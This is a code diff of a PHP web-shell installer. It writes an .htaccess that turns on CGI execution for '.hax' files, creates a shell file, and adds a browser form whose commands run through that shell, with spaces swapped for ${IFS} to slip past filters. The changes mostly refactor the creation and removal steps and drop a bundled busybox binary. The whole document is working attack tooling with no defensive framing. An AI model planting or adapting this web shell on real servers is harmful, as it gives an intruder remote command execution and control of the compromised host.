@@ -1,11 +1,8 @@
-<a href="?create=1">Create</a> / <a href="?remove=1">Remove</a> shell files
-<pre>
 <?php
 
 $dir = 'shell';
 $htaccess = '.htaccess';
 $shell = 'shell.hax';
-$busybox = 'busybox';
 
 function create_directory($folder) {
     echo "Creating directory... ";
@@ -16,7 +13,7 @@ function create_directory($folder) {
 function create_htaccess($file) {
     echo "Creating htaccess... ";
     $handle = fopen($file, 'w') or die('failed<br />');
-    $data = "Options +ExecCGI +Indexes\nAddHandler cgi-script .hax";
+    $data = "Options +ExecCGI\nAddHandler cgi-script .hax";
     fwrite($handle, $data);
     fclose($handle);
     echo "done<br />";
@@ -34,52 +31,68 @@ function create_shell($file) {
     echo "done<br />";
 }
 
-function create_busybox($busybox, $busyboxbin) {
-    echo "Creating busybox binary... ";
-    copy($busybox, $busyboxbin) or die('failed to copy file<br />');
-    chmod($busyboxbin, 0755) or die('failed to set permissions<br />');
-    echo "done<br />";
-}
-
-$htaccess = $dir . '/' . $htaccess;
-$shell = $dir . '/' . $shell;
-$busyboxbin = $dir . '/' . $busybox . '.bin';
-
-if ($_REQUEST['remove']) {
-    if (file_exists($htaccess)) {
-        echo "Deleting htaccess... ";
-        unlink($htaccess);
-        echo "done<br />";
-    }
+function remove_shell($shell) {
     if (file_exists($shell)) {
         echo "Deleting shell... ";
         unlink($shell);
         echo "done<br />";
     }
-    if (file_exists($busyboxbin)) {
-        echo "Deleting busybox binary... ";
-        unlink($busyboxbin);
+}
+
+function remove_htaccess($htaccess) {
+    if (file_exists($htaccess)) {
+        echo "Deleting htaccess... ";
+        unlink($htaccess);
         echo "done<br />";
     }
+}
+
+function remove_directory($dir) {
     if (is_dir($dir)) {
         echo "Deleting folder... ";
         rmdir($dir);
         echo "done<br />";
     }
-    echo "Removal complete<br />";
-    exit;
+}
+
+function display_shell($shell) {
+    if (file_exists($shell)) {
+        echo "<p>shell at [<a href=\"$shell\">$shell</a>] (<a href=\"?remove=1\">remove</a>)</p>";
+        echo "<form action=\"$_SERVER[PHP_SELF]\" method=\"post\">Command: <input autofocus type=\"text\" name=\"cmd\" /><input type=\"submit\" value=\"Exec\" /></form>";
+    }
+    else {
+
+        echo "<p>no shell found (<a href=\"?create=1\">create</a>)</p>";
+    }
+}
+
+function execute_command($shell, $cmd) {
+    $path = dirname($_SERVER['PHP_SELF']);
+    $shell_url = "http://$_SERVER[HTTP_HOST]$path/$shell";
+    $cmd = str_replace(' ', '${IFS}', $cmd);
+    $response = file_get_contents($shell_url . '?' . $cmd);
+    echo "Output:<br /><textarea rows=25 cols=80>$response</textarea>";
+}
+
+$htaccess = $dir . '/' . $htaccess;
+$shell = $dir . '/' . $shell;
+
+if ($_REQUEST['remove']) {
+    remove_shell($shell);
+    remove_htaccess($htaccess);
+    remove_directory($dir);
 }
 
 if ($_REQUEST['create']) {
     create_directory($dir);
     create_htaccess($htaccess);
     create_shell($shell);
-    create_busybox($busybox, $busyboxbin);
 }
 
-if (file_exists($shell)) {
-    echo "<br />[<a href=\"$shell\">$shell</a>]<br />";
+display_shell($shell);
+
+if ($_REQUEST['cmd']) {
+    $cmd = $_REQUEST['cmd'];
+    execute_command($shell, $cmd);
 }
 ?>
-</pre>
-
